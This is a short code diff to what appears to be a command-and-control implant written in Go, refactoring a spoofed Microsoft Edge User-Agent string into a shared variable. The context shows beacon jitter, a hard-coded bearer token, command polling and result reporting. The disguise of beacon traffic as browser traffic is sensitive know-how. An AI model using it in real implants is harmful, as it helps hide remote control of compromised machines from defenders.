@@ -49,6 +49,7 @@ var (
 var (
     beaconMin = 10
     beaconMax = 30
+    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
 )
 
 
@@ -146,7 +147,7 @@ func fetchCommand(agentID string) (Command, error) {
     // Add hard-coded Bearer token for authentication
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("X-Agent-ID", agentID)
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")
+    req.Header.Set("User-Agent", userAgent)
 
 
     tr := &http.Transport{
@@ -200,7 +201,7 @@ func sendResult(result CommandResult) {
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("Content-Type", "application/json")
     req.Header.Set("X-Agent-ID", agentID) // use global variable here
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")
+    req.Header.Set("User-Agent", userAgent)
 
 
     tr := &http.Transport{
@@ -432,7 +433,7 @@ func publicIp(cmd Command) {
     }
 
     // ✅ Set Microsoft Edge User-Agent
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")
+    req.Header.Set("User-Agent", userAgent)
 
     client := &http.Client{Timeout: 5 * time.Second}
     resp, err := client.Do(req)
@@ -1045,4 +1046,3 @@ func updateBeaconInterval(cmd Command) {
         Result: fmt.Sprintf("✅ Beacon interval updated: min=%d, max=%d", beaconMin, beaconMax),
     })
 }
-
